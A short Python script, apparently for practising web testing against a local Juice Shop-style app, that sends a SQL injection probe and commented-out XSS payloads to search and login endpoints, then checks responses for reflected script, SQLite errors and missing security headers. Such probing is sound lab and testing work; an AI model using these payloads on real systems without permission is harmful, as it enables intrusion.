import requests
import urllib

def send_request():
    # endpoint = input("endpoint: ")
    # endpoint = "/rest/user/login"
    # endpoint = "/track-result?id="

    endpoint = "/rest/products/search?q="
    print(endpoint)
    # command = input("command (GET or POST): ").strip().upper()
    command = "GET"

    # payload = input("body (JSON) or payload: ").strip()
    # payload = "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"
    # payload = "<script>alert(1)</script>"
    payload = "';"
    payload_encoded = urllib.parse.quote(payload)



    url = f"http://192.168.1.119:3000{endpoint}"
    print(url)

    if "POST" == command:
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, data=payload, headers=headers)
    else:
        response = requests.get(url + payload_encoded)

    print(f"status: {response.status_code} \t reason: {response.reason}")
    response_body = response.text
    # print(f"body: {response_body}")

    with open("response_payload.html", "w", encoding="utf-8") as f:
        f.write(response_body)

    if ";&lt;script&gt" in response_body or "<script>" in response_body:
        print("SUCCESS: Reflected XSS vulnerability found!")

    if "SQLITE_ERROR" in response_body:
        print("SUCCESS: SQL injection vulnerability found")

    response_headers = response.headers
    if "Content-Security-Policy" not in response_headers:
        print(f"Low Severity: Missing CSP header")
    if "Strict-Transport-Security" not in response_headers:
        print(f"Low Severity: Missing HSTS header")
    if "X-Content-Type-Options" not in response_headers:
        print(f"Low Severity: Missing Content Type Options header")




if __name__ == '__main__':
    send_request()